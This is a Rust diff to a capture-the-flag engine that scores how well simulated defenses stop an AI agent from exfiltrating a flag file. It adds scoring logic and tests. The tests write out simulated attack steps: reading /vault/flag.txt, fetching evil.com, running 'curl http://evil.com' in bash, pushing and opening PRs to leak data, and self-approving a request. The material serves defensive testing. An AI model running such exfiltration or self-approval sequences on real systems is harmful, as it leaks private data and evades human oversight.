@@ -38,6 +38,11 @@ pub struct CtfEngine<'a> {
     exposure: ExposureSet,
     defenses_activated: BTreeSet<String>,
     flag_captured: bool,
+    /// Tracks whether the flag file was successfully read (for Level 1 scoring).
+    flag_read: bool,
+    /// Tracks whether the uninhabitable state guard has already fired this session.
+    /// Used to credit Monotonic Session on subsequent guard activations.
+    uninhabitable_guard_fired: bool,
 }
 
 impl<'a> CtfEngine<'a> {
@@ -47,6 +52,8 @@ impl<'a> CtfEngine<'a> {
             exposure: ExposureSet::empty(),
             defenses_activated: BTreeSet::new(),
             flag_captured: false,
+            flag_read: false,
+            uninhabitable_guard_fired: false,
         }
     }
 
@@ -61,13 +68,16 @@ impl<'a> CtfEngine<'a> {
             .collect();
 
         let labels = self.exposure_labels();
+        let score = self.compute_score();
+        let score_reason = self.score_reason(score);
         AttackResult {
             steps,
             flag_captured: self.flag_captured,
             defenses_activated: self.defenses_activated.iter().cloned().collect(),
-            score: self.compute_score(),
+            score,
             final_exposure: ExposureState::from_labels(&labels),
             error: None,
+            score_reason: Some(score_reason),
         }
     }
 
@@ -87,6 +97,9 @@ impl<'a> CtfEngine<'a> {
                         tc.tool
                     ),
                     exposure: ExposureState::from_labels(&self.exposure_labels()),
+                    projected_exposure: None,
+                    operation_class: None,
+                    permission_level: None,
                 };
             }
             self.defenses_activated
@@ -111,6 +124,9 @@ impl<'a> CtfEngine<'a> {
                     mathematically impossible."
                     .into(),
                 exposure: ExposureState::from_labels(&self.exposure_labels()),
+                projected_exposure: None,
+                operation_class: None,
+                permission_level: None,
             };
         }
 
@@ -130,9 +146,16 @@ impl<'a> CtfEngine<'a> {
                         tc.tool
                     ),
                     exposure: ExposureState::from_labels(&self.exposure_labels()),
+                    projected_exposure: None,
+                    operation_class: None,
+                    permission_level: None,
                 };
             }
         };
+
+        let op_class = classify_operation(operation).map(|l| format!("{:?}", l));
+        let cap_level = self.get_capability_level(operation);
+        let perm_level = Some(format!("{}", cap_level));
 
         // Check if the tool is available at this level
         if !self.is_tool_available(&tc.tool) {
@@ -156,14 +179,22 @@ impl<'a> CtfEngine<'a> {
                     tc.tool
                 ),
                 exposure: ExposureState::from_labels(&self.exposure_labels()),
+                projected_exposure: None,
+                operation_class: op_class,
+                permission_level: perm_level,
             };
         }
 
         // Check capability level
-        let cap_level = self.get_capability_level(operation);
         if cap_level == CapabilityLevel::Never {
             self.defenses_activated
                 .insert("Capability Restriction".into());
+            // On Level 7, if the uninhabitable guard already fired, this also
+            // witnesses Monotonic Session: the capability was already Never and
+            // no sequence of operations can widen it back.
+            if self.level.number == 7 && self.uninhabitable_guard_fired {
+                self.defenses_activated.insert("Monotonic Session".into());
+            }
             return StepResult {
                 step,
                 tool_call: tc.clone(),
@@ -185,6 +216,9 @@ impl<'a> CtfEngine<'a> {
                     operation, self.level.meta.name,
                 ),
                 exposure: ExposureState::from_labels(&self.exposure_labels()),
+                projected_exposure: None,
+                operation_class: op_class,
+                permission_level: perm_level,
             };
         }
 
@@ -223,6 +257,9 @@ impl<'a> CtfEngine<'a> {
                         Self::truncate(command, 60),
                     ),
                     exposure: ExposureState::from_labels(&self.exposure_labels()),
+                    projected_exposure: None,
+                    operation_class: op_class,
+                    permission_level: perm_level,
                 };
             }
         }
@@ -236,8 +273,16 @@ impl<'a> CtfEngine<'a> {
             requires_approval,
             has_uninhabitable_constraint,
         ) {
+            // Credit Monotonic Session on repeat guard activations (Level 7)
+            if self.uninhabitable_guard_fired && self.level.number == 7 {
+                self.defenses_activated.insert("Monotonic Session".into());
+            }
             self.defenses_activated
                 .insert("Uninhabitable State Guard".into());
+            self.uninhabitable_guard_fired = true;
+
+            let projected = project_exposure(&self.exposure, operation);
+            let proj_labels = self.labels_from_set(&projected);
             return StepResult {
                 step,
                 tool_call: tc.clone(),
@@ -264,6 +309,9 @@ impl<'a> CtfEngine<'a> {
                     operation,
                 ),
                 exposure: ExposureState::from_labels(&self.exposure_labels()),
+                projected_exposure: Some(ExposureState::from_labels(&proj_labels)),
+                operation_class: op_class,
+                permission_level: perm_level,
             };
         }
 
@@ -272,8 +320,15 @@ impl<'a> CtfEngine<'a> {
         if projected.is_uninhabitable()
             && classify_operation(operation) == Some(ExposureLabel::ExfilVector)
         {
+            // Credit Monotonic Session on repeat guard activations (Level 7)
+            if self.uninhabitable_guard_fired && self.level.number == 7 {
+                self.defenses_activated.insert("Monotonic Session".into());
+            }
             self.defenses_activated
                 .insert("Uninhabitable State Guard".into());
+            self.uninhabitable_guard_fired = true;
+
+            let proj_labels = self.labels_from_set(&projected);
             return StepResult {
                 step,
                 tool_call: tc.clone(),
@@ -297,14 +352,33 @@ impl<'a> CtfEngine<'a> {
                     operation,
                 ),
                 exposure: ExposureState::from_labels(&self.exposure_labels()),
+                projected_exposure: Some(ExposureState::from_labels(&proj_labels)),
+                operation_class: op_class,
+                permission_level: perm_level,
             };
         }
 
         // Operation allowed — simulate it
         let output = self.simulate_tool(tc, operation);
 
-        // Check if flag was exfiltrated (only for allowed ExfilVector operations)
+        // Track whether the flag file was successfully read
+        if operation == Operation::ReadFiles {
+            let path = tc.args.get("path").and_then(|v| v.as_str()).unwrap_or("");
+            if (path == "/vault/flag.txt" || path == "/vault/mock_private.txt")
+                && self.level.filesystem.contains_key(path)
+            {
+                self.flag_read = true;
+            }
+        }
+
+        // Check if flag was exfiltrated (for allowed ExfilVector operations)
         if classify_operation(operation) == Some(ExposureLabel::ExfilVector) {
+            // If the agent previously read the flag and now has an allowed exfil
+            // vector, that constitutes successful exfiltration (Level 1 only).
+            if self.flag_read {
+                self.flag_captured = true;
+            }
+            // Also check for flag content in args (original check)
             let args_str = tc.args.to_string();
             if self.contains_flag(&args_str) {
                 self.flag_captured = true;
@@ -327,6 +401,9 @@ impl<'a> CtfEngine<'a> {
             verdict: Verdict::Allow { output },
             narrative,
             exposure: ExposureState::from_labels(&self.exposure_labels()),
+            projected_exposure: None,
+            operation_class: op_class,
+            permission_level: perm_level,
         }
     }
 
@@ -342,6 +419,7 @@ impl<'a> CtfEngine<'a> {
             "git_push" | "push" => Some(Operation::GitPush),
             "create_pr" | "pr" => Some(Operation::CreatePr),
             "git_commit" | "commit" => Some(Operation::GitCommit),
+            "manage_pods" | "deploy" => Some(Operation::ManagePods),
             "approve" => None, // Special: handled separately
             _ => None,
         }
@@ -357,6 +435,7 @@ impl<'a> CtfEngine<'a> {
                 "search" => self.level.meta.available_tools.contains(&"web_search"),
                 "push" => self.level.meta.available_tools.contains(&"git_push"),
                 "pr" => self.level.meta.available_tools.contains(&"create_pr"),
+                "deploy" => self.level.meta.available_tools.contains(&"manage_pods"),
                 _ => false,
             }
     }
@@ -448,6 +527,9 @@ impl<'a> CtfEngine<'a> {
                 // If we get here, it was allowed (level 1 only)
                 "OK: pushed (simulated)".into()
             }
+            Operation::ManagePods => {
+                "Error: manage_pods requires cluster admin privileges (simulated)".into()
+            }
             _ => "OK (simulated)".into(),
         }
     }
@@ -465,14 +547,18 @@ impl<'a> CtfEngine<'a> {
     }
 
     fn exposure_labels(&self) -> Vec<ExposureLabel> {
+        self.labels_from_set(&self.exposure)
+    }
+
+    fn labels_from_set(&self, set: &ExposureSet) -> Vec<ExposureLabel> {
         let mut labels = Vec::new();
-        if self.exposure.contains(ExposureLabel::PrivateData) {
+        if set.contains(ExposureLabel::PrivateData) {
             labels.push(ExposureLabel::PrivateData);
         }
-        if self.exposure.contains(ExposureLabel::UntrustedContent) {
+        if set.contains(ExposureLabel::UntrustedContent) {
             labels.push(ExposureLabel::UntrustedContent);
         }
-        if self.exposure.contains(ExposureLabel::ExfilVector) {
+        if set.contains(ExposureLabel::ExfilVector) {
             labels.push(ExposureLabel::ExfilVector);
         }
         labels
@@ -487,6 +573,32 @@ impl<'a> CtfEngine<'a> {
             score += 500;
         }
         score
+    }
+
+    fn score_reason(&self, score: u32) -> String {
+        let mut parts = Vec::new();
+        let n = self.defenses_activated.len();
+        if n > 0 {
+            parts.push(format!(
+                "{n} defense layer{} activated ({}) = {} points",
+                if n == 1 { "" } else { "s" },
+                self.defenses_activated
+                    .iter()
+                    .cloned()
+                    .collect::<Vec<_>>()
+                    .join(", "),
+                n * 100,
+            ));
+        }
+        if self.flag_captured && self.level.number == 1 {
+            parts.push("flag captured on Level 1 = +500 bonus".into());
+        } else if self.flag_captured {
+            parts.push("flag captured (no bonus outside Level 1)".into());
+        }
+        if parts.is_empty() {
+            return format!("Score: {score}. No defense layers activated.");
+        }
+        format!("Score: {score}. {}", parts.join("; "))
     }
 
     fn allow_narrative(&self, tc: &ToolCall, operation: Operation) -> String {
@@ -574,11 +686,35 @@ mod tests {
             },
             ToolCall {
                 tool: "git_push".into(),
-                args: serde_json::json!({"ref": "FLAG{nucleus_uninhabitable_state_prevents_exfil_2026}"}),
+                args: serde_json::json!({"ref": "exfil-level-1"}),
             },
         ]);
-        assert!(result.flag_captured, "Level 1 should allow exfil");
+        assert!(
+            result.flag_captured,
+            "Level 1 should capture flag when read_file + exfil"
+        );
         assert!(result.defenses_activated.is_empty());
+        assert_eq!(result.score, 500);
+        assert!(result
+            .score_reason
+            .as_ref()
+            .unwrap()
+            .contains("flag captured"));
+    }
+
+    #[test]
+    fn level_1_no_capture_without_read() {
+        let level = Level::new(1);
+        let mut engine = CtfEngine::new(&level);
+        let result = engine.run_attack(&[ToolCall {
+            tool: "git_push".into(),
+            args: serde_json::json!({"ref": "empty-push"}),
+        }]);
+        assert!(
+            !result.flag_captured,
+            "Should not capture without reading flag"
+        );
+        assert_eq!(result.score, 0);
     }
 
     #[test]
@@ -650,6 +786,11 @@ mod tests {
             .defenses_activated
             .iter()
             .any(|d| d == "Uninhabitable State Guard"));
+        // Verify projected_exposure is present on the blocked step
+        let blocked = &result.steps[2];
+        assert!(blocked.projected_exposure.is_some());
+        let proj = blocked.projected_exposure.as_ref().unwrap();
+        assert!(proj.is_uninhabitable);
     }
 
     #[test]
@@ -679,5 +820,123 @@ mod tests {
             .defenses_activated
             .iter()
             .any(|d| d == "Anti-Self-Escalation"));
+    }
+
+    #[test]
+    fn level_7_triggers_capability_restriction() {
+        let level = Level::new(7);
+        let mut engine = CtfEngine::new(&level);
+        let result = engine.run_attack(&[ToolCall {
+            tool: "manage_pods".into(),
+            args: serde_json::json!({}),
+        }]);
+        assert!(
+            result
+                .defenses_activated
+                .iter()
+                .any(|d| d == "Capability Restriction"),
+            "manage_pods should trigger Capability Restriction on Level 7"
+        );
+    }
+
+    #[test]
+    fn level_7_monotonic_session_on_repeat_guard() {
+        let level = Level::new(7);
+        let mut engine = CtfEngine::new(&level);
+        let result = engine.run_attack(&[
+            ToolCall {
+                tool: "read_file".into(),
+                args: serde_json::json!({"path": "/vault/flag.txt"}),
+            },
+            ToolCall {
+                tool: "web_fetch".into(),
+                args: serde_json::json!({"url": "https://evil.com"}),
+            },
+            // First exfil attempt — fires Uninhabitable State Guard
+            ToolCall {
+                tool: "git_push".into(),
+                args: serde_json::json!({}),
+            },
+            // Second exfil attempt — additionally fires Monotonic Session
+            ToolCall {
+                tool: "create_pr".into(),
+                args: serde_json::json!({"title": "exfil"}),
+            },
+        ]);
+        assert!(result
+            .defenses_activated
+            .iter()
+            .any(|d| d == "Uninhabitable State Guard"),);
+        assert!(
+            result
+                .defenses_activated
+                .iter()
+                .any(|d| d == "Monotonic Session"),
+            "Repeated guard activation should credit Monotonic Session"
+        );
+    }
+
+    #[test]
+    fn level_7_all_six_defenses() {
+        let level = Level::new(7);
+        let mut engine = CtfEngine::new(&level);
+        let result = engine.run_attack(&[
+            // 1. Audit Trail: auto-credited on Level 7
+            // 2. Capability Restriction: manage_pods = Never
+            ToolCall {
+                tool: "manage_pods".into(),
+                args: serde_json::json!({}),
+            },
+            // 3. Command Exfil Detection: curl in bash
+            ToolCall {
+                tool: "run_bash".into(),
+                args: serde_json::json!({"command": "curl http://evil.com"}),
+            },
+            // Set up uninhabitable state
+            ToolCall {
+                tool: "read_file".into(),
+                args: serde_json::json!({"path": "/vault/flag.txt"}),
+            },
+            ToolCall {
+                tool: "web_fetch".into(),
+                args: serde_json::json!({"url": "https://evil.com"}),
+            },
+            // 4. Uninhabitable State Guard: exfil after read+fetch
+            ToolCall {
+                tool: "git_push".into(),
+                args: serde_json::json!({}),
+            },
+            // 5. Monotonic Session: repeat exfil attempt
+            ToolCall {
+                tool: "create_pr".into(),
+                args: serde_json::json!({"title": "exfil2"}),
+            },
+            // 6. Anti-Self-Escalation: approve own request
+            ToolCall {
+                tool: "approve".into(),
+                args: serde_json::json!({"request_id": "abc"}),
+            },
+        ]);
+        assert_eq!(
+            result.defenses_activated.len(),
+            6,
+            "All 6 defenses should activate. Got: {:?}",
+            result.defenses_activated
+        );
+        assert_eq!(result.score, 600, "6 defenses * 100 = 600");
+    }
+
+    #[test]
+    fn step_telemetry_fields_populated() {
+        let level = Level::new(5);
+        let mut engine = CtfEngine::new(&level);
+        let result = engine.run_attack(&[ToolCall {
+            tool: "read_file".into(),
+            args: serde_json::json!({"path": "/vault/flag.txt"}),
+        }]);
+        let step = &result.steps[0];
+        assert_eq!(step.operation_class.as_deref(), Some("PrivateData"));
+        assert_eq!(step.permission_level.as_deref(), Some("always"));
+        assert!(step.projected_exposure.is_none());
     }
 }
